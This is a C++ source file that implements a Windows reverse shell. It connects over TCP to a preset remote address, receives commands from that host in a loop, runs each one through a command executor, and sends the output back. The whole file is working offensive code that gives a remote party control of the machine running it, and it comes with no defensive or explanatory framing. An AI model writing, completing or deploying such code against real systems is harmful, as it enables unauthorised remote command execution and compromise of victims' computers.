// ReverseShell.cpp
#include "ReverseShell.h"
#include "WinAPIException.h"
#include <ws2tcpip.h>
#include <vector>
#include <string>

void ReverseShell::start() {
    WinSockManager winsock;
    
    SocketHandler socket(::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP));
    if (socket == INVALID_SOCKET) {
        throw WinAPIException("Socket creation failed");
    }

    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(DEFAULT_PORT);
    inet_pton(AF_INET, DEFAULT_IP, &serverAddress.sin_addr);

    socket.connect(serverAddress);

    std::vector<char> commandBuffer(DEFAULT_BUFLEN);
    while (true) {
        try {
            int bytesReceived = socket.receive(commandBuffer.data(), DEFAULT_BUFLEN);
            if (bytesReceived <= 0) break;

            commandBuffer[bytesReceived] = '\0';
            std::string command(commandBuffer.data());

            std::string output;
            try {
                output = CommandExecutor::execute(command);
            } catch (const std::exception& e) {
                output = "[!] Error: " + std::string(e.what()) + "\n";
            }

            socket.send(output.c_str(), output.size());
        } 
        catch (const WinAPIException& e) {
            break;
        }
    }
}
